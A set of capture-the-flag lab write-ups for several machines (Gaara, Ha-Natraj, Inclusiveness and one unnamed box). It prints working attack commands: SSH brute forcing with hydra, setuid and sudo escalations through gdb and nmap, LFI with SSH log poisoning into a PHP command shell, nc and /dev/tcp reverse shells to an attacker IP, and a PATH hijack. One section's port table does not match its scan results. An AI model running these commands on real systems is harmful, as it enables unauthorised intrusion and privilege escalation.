## Gaara

### Enumeration

Machine IP &rarr; `192.168.208.142`

#### Network Scan

Nmap scan &rarr; `nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.208.142`

OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

| **Port** | **Service** | **Other details (if any)**                     |
| -------- | ----------- | ---------------------------------------------- |
| 22       | SSH         | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 80       | HTTP        | Apache httpd 2.4.38 ((Debian))                 |

#### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.208.142 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php`

This did not reveal any useful information.

### Exploitation

Using the image on the webpage as a reference, the username could be `gaara`. Therefore, used hydra to brute force the ssh server against the rockyou password list.

```other
hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.208.142:22
```

This gives the password as `iloveyou2` and subsequently gets the user flag.

### Privilege Escalation

Checking for setuid binaries reveals the presence of `gdb` as a setuid to root executable. The user is not present in the sudoers file. Therefore, it is essential to escalate using the `gdb` binary.

This is done as follows &rarr; `gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit`.

This grants the root shell and subsequently the root flag.

### Enumeration

Machine IP &rarr; `192.168.56.82`

#### Network Scan

Nmap scan &rarr; `nmap -sC -A -Pn -p- -o nmap.txt 192.168.56.82`

OS Detection &rarr;  `OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel`

| **Port** | **Service** | **Other details (if any)**                     |
| -------- | ----------- | ---------------------------------------------- |
| 21       | FTP         | vsftpd 3.0.3                                   |

| 9198     | HTTP        | SimpleHTTPServer 0.6 (Python 2.7.16)           |

#### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.56.82:<ports> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php`

Directories/files listed &rarr;

Port 8088 &rarr;

- cgi-bin/ (404)
- docs/
- blocked/ (403)

Port 7125 &rarr;

- shadow (403)
- passwd

The passwd file lists user `geisha`.

### Exploitation

With the username as `geisha`, a brute force was launched on the ssh server using hydra as follows &rarr; `hydra -l geisha -P /home/tanq/installations/SecLists/rockyou.txt ssh://192.168.56.82`.

This gives the password as `letmein`. After a successful login, the user flag can be obtained.

### Privilege Escalation

Using the user shell, enumerated for setuid binaries as follows &rarr; `find / -perm -u=s 2>/dev/null`.

This resulted in an interesting find for the binary `/usr/bin/base32`. This could be used to read files with a privileged access, thereby allowing reads of files owned by root. Therefore, it was used to read the root flag as follows &rarr;

```
file=/root/proof.txt
/usr/bin/base32 "$file" | /usr/bin/base32 --decode
```

This can also be used to obtain root shell by using it to leak the ssh key of root and then using it to log in to the machine via ssh.

This gave the root flag.

## Ha-Natraj

### Enumeration

Machine IP &rarr; `192.168.51.80`

#### Network Scan

Nmap scan &rarr; `nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.51.80`

OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

#### Table

| **Port** | **Service** | **Other details (if any)**                                   |
| -------- | ----------- | ------------------------------------------------------------ |
| 22       | SSH         | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80       | HTTP        | Apache httpd 2.4.29 (Ubuntu)                                 |

#### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.51.80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php`

Directories/files listed &rarr;

- images/
- index.html
- console/

The `console/` directory has a php file present in it called `file.php`.

### Exploitation

#### LFI

Running the `file.php` file does not give any output. As a good practice checking for LFI using `?file=../../../../../etc/passwd` works out and LFI is possible. There is an ssh service on the machine, therefore, checked log files. The auth log file at `/var/log/auth.log` contains the ssh logs.

#### Transition LFI to SSH Log Poisoning

Given the presence of SSH logs, poisoning is tested by using payload &rarr; `ssh "<?php system(\$_GET['cmd']);?>"@<192.168.125.80>`. A failed login attempt gets logged and the php code is inserted. LFI can now be used to execute the php in the log file, with the addition of the `cmd` parameter like so &rarr; `..console/file.php?file=/var/log/auth.log&cmd=id`. This returned the id of the `www-data` user in the response i.e., RCE.

#### User shell

Using the RCE, a shell can be spawned by using bash payload &rarr; `bash -i >& /dev/tcp/192.168.49.208/3002 0>&1` to get a reverse shell. This can be done via burp to URL encode and send the payload. There was no bash in the system, therefore reverting to nc and /bin/sh combo &rarr; `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.208 3002 >/tmp/f`.

This gives a `www-data` user shell via netcat.

### Privilege Escalation

#### Escalated User

With the `www-data` shell, the linenum script can be run (example &rarr; [linenum script](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)). This gives the files which are writable by the current user. One such file is the `apache2.conf` file which can be modified to ensure execution of the web server as a privileged user by editing the User and Group to be `mahakal`, a user detected by looking at the `/etc/passwd` file.

Next, a pentest monkey php reverse shell is plugged into the serving directory for navigation to it. This can be named `exploit.php`. The server needs to be restarted for the new settings to be applied. Therefore, as revealed using `sudo -l`, the server can be restarted as super user without the need of a password using the systemctl command as the `www-data` user.

After it is restarted, a listener can be used to receive shell as the user `mahakal`.

#### Root

As the user `mahakal`, the binary that can be run as as a super user without a password as revealed by `sudo -l` is actually `nmap`.

Nmap can be used to launch an interactive interpreter using &rarr;

```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF
```

Thus, the shell received is actually that of root. This gives the root flag.

## Inclusiveness

### Enumeration

Machine IP &rarr; `192.168.80.14`

#### Network Scan

Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.14`

OS Detection &rarr;  `OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel`

| **Port** | **Service** | **Other details (if any)**                     |
| -------- | ----------- | ---------------------------------------------- |
| 21       | FTP         | vsftpd 3.0.3 &rarr; *Anonymous FTP allowed*         |
| 22       | SSH         | OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) |
| 80       | HTTP        | Apache httpd 2.4.38 ((Debian))                 |

#### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.80.14 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt`

Directories/files listed &rarr;

- index.html
- robots.txt
- seo.html
- javascript/
- manual/

Looking at the robots.txt, it says only search engines are allowed to access it. Therefore, changing the User-Agent to `GoogleBot` in burp allows bypassing this restriction. This gives the directory `/secret_information/`.

### Exploitation

#### LFI

The `/secret_information/` directory consists of an introduction to DNS Zone transfer attacks and links to display it in English or Spanish. The links are of the form `..?lang=language.php`. Therefore, attempting LFI here allows to print contents of the `/etc/passwd` file. This gives enumeration of the users &rarr; `tom` and `root`.

The anonymous ftp login shows that the `pub` directory of the FTP service is world writeable. Therefore, it is a good place for landing payloads. To get the exact path of the location, the configuration file must be read. From the service enumeration, the version is known to be vsftpd 3.0.3. The default config for this is at `/etc/vsftpd.conf`.

Using LFI to print this shows the following &rarr;

```
anon_root=/var/ftp/
write_enable=YES
```

#### Reverse shell from Anonymous write-enabled FTP and LFI

Using the FTP to upload a reverse shell in PHP and then using LFI to navigate to the payload using the path found in the config file grants the shell as user `www-data`. The payload used is pentest monkey's PHP reverse shell.

Enumerating the setuid binaries, an interesting find was the presence of `/home/tom/rootshell`, which indicates getting privilege of user `tom` is the step required to get root on the machine.

### Privilege Escalation

#### User

The home directory of the user `tom` is readable by `www-data`. Therefore, visiting it grants access to the code of the rootshell binary found above. This also gives the user flag.

The code of the rootshell binary uses `FILE* f = popen("whoami", "r");`. This does not use an exact path, therefore, the PATH variable can be abused to trick the program into evaluating the username as `tom`. Therefore, creating a new directory in `/tmp` and an executable `whoami` under it that prints tom allows adding this to the current PATH.

```
echo '#!/bin/bash' > whoami
echo 'echo tom' >> whoami
chmod +x whoami
export PATH=/tmp/testdirectory
```

This allows for execution of the rootshell binary, which evaluates all checks to true and grants the root shell, thereby the root flag.
